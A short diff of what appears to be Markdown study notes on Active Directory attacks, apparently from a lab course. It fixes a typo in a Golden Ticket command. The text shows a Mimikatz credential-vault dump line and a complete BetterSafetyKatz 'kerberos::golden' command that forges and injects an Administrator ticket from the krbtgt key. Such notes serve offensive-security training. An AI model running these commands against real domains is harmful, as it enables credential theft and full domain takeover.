@@ -44,5 +44,5 @@ Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 ### **Using the secrets of krbtgt account, create a Golden ticket**
 Just use BetterSafetyKatz
 ```powershell
-> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<NOME DOMINIO> /sid:<SID DC(lsa dynìì)> /aes256:<AES KRBTGT> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<NOME DOMINIO> /sid:<SID DC(lsa dump safetykatz> /aes256:<AES KRBTGT> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
